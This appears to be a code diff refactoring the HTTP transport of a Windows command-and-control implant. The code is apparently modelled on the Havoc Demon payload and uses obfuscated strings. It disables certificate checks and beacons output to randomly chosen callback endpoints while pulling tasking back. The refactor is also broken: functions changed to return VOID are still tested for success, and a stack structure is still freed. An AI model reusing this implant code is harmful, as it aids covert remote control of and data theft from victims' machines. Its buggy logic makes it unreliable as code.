@@ -56,7 +56,7 @@ namespace Http {
         }
     }
 
-    VOID DestroyProxyContext(_proxy_context *proxy_ctx) {
+    VOID DestroyProxyContext(const _proxy_context *proxy_ctx) {
         HEXANE
 
         if (proxy_ctx) {
@@ -66,12 +66,10 @@ namespace Http {
         }
     }
 
-    _request_context* CreateRequestContext() {
+     VOID CreateRequestContext(_request_context* req_ctx) {
         HEXANE
 
-        _request_context *req_ctx = R_CAST(_request_context*, x_malloc(sizeof(_request_context)));
         wchar_t *endpoint   = { };
-        uint32_t n_endpoint = 0;
 
         if (!Ctx->transport.http->handle) {
             if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
@@ -84,8 +82,8 @@ namespace Http {
         }
 
         if (Ctx->transport.http->endpoints) {
-            n_endpoint  = Utils::Random::RandomNumber32();
-            endpoint    =  Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
+            const auto n_endpoint = Utils::Random::RandomNumber32();
+            endpoint =  Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
 
             req_ctx->endpoint = R_CAST(wchar_t*, x_malloc((x_wcslen(endpoint) + 1) * sizeof(wchar_t)));
             x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
@@ -106,14 +104,10 @@ namespace Http {
                 x_free(req_ctx);
             }
         }
-
-        return req_ctx;
     }
 
-    _proxy_context* CreateProxyContext(_request_context *req_ctx) {
+    VOID CreateProxyContext(_proxy_context *proxy_ctx, const _request_context *req_ctx) {
         HEXANE
-
-        _proxy_context *proxy_ctx = R_CAST(_proxy_context*, x_malloc(sizeof(_proxy_context)));
 
         if (Ctx->transport.b_proxy) {
             proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
@@ -187,16 +181,14 @@ namespace Http {
                 proxy_ctx = nullptr;
             }
         }
-
-        return proxy_ctx;
     }
 
     VOID HttpCallback(const _stream *const out, _stream **in) {
         HEXANE
         // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
 
-        _proxy_context *proxy_ctx = { };
-        _request_context *req_ctx = { };
+        _proxy_context proxy_ctx = { };
+        _request_context req_ctx = { };
 
         wchar_t *header     = { };
         uint32_t status     = 0;
@@ -208,8 +200,8 @@ namespace Http {
         Ctx->transport.http->method = OBFW(L"GET");
 
         if (
-            !(req_ctx = CreateRequestContext()) ||
-            !(proxy_ctx = CreateProxyContext(req_ctx))) {
+            !CreateRequestContext(&req_ctx) ||
+            !CreateProxyContext(&proxy_ctx, &req_ctx)) {
             return_defer(ntstatus);
         }
 
@@ -219,44 +211,44 @@ namespace Http {
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-            if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG))) {
+            if (!Ctx->win32.WinHttpSetOption(req_ctx.req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG))) {
                 return_defer(ntstatus);
             }
         }
 
         if (Ctx->transport.http->headers) {
             while (true) {
-                if (!Ctx->transport.http->headers[n_headers]) { break; }
-                else {
-
-                    header = Ctx->transport.http->headers[n_headers];
-                    if (!Ctx->win32.WinHttpAddRequestHeaders(req_ctx->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
-                        return_defer(ntstatus);
-                    }
-
-                    n_headers++;
+                if (!Ctx->transport.http->headers[n_headers]) {
+                    break;
                 }
+
+                header = Ctx->transport.http->headers[n_headers];
+                if (!Ctx->win32.WinHttpAddRequestHeaders(req_ctx.req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+                    return_defer(ntstatus);
+                }
+
+                n_headers++;
             }
         }
         if (
-            !Ctx->win32.WinHttpSendRequest(req_ctx->req_handle, nullptr, 0, out->buffer, out->length, out->length, 0) ||
-            !Ctx->win32.WinHttpReceiveResponse(req_ctx->req_handle, nullptr)) {
+            !Ctx->win32.WinHttpSendRequest(req_ctx.req_handle, nullptr, 0, out->buffer, out->length, out->length, 0) ||
+            !Ctx->win32.WinHttpReceiveResponse(req_ctx.req_handle, nullptr)) {
             return_defer(ntstatus);
         }
 
         if (
-            !Ctx->win32.WinHttpQueryHeaders(req_ctx->req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, R_CAST(LPDWORD, &n_status), nullptr)) {
+            !Ctx->win32.WinHttpQueryHeaders(req_ctx.req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, R_CAST(LPDWORD, &n_status), nullptr)) {
             return_defer(ntstatus);
         }
         if (status != HTTP_STATUS_OK) {
             return_defer(status);
         }
 
-        HttpSendRequest(req_ctx->req_handle, in);
+        HttpSendRequest(req_ctx.req_handle, in);
 
         defer:
-        DestroyRequestContext(req_ctx);
-        DestroyProxyContext(proxy_ctx);
+        DestroyRequestContext(&req_ctx);
+        DestroyProxyContext(&proxy_ctx);
     }
 }
 
